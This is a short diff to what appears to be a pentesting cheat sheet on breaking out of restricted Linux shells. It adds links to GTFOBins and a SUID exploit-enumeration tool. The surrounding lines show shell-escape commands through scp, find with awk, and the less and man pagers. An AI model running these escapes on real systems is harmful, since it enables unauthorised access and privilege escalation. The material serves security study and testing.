@@ -193,6 +193,10 @@ https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells
 
 
 # Use binary with command execution
+
+## All sbits shell
+  https://gtfobins.github.io/gtfobins/
+  
 ## scp -S
     scp -S /home/untrusted/script.sh x y:
 
@@ -235,6 +239,9 @@ https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells
 ## find
     find / -name blahblah -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
 
+## Auto sbin exploit
+  https://github.com/Anon-Exploiter/SUID3NUM
+  
 ## More, Less, and Man Commands
 !commandxxx
 '! /bin/sh'
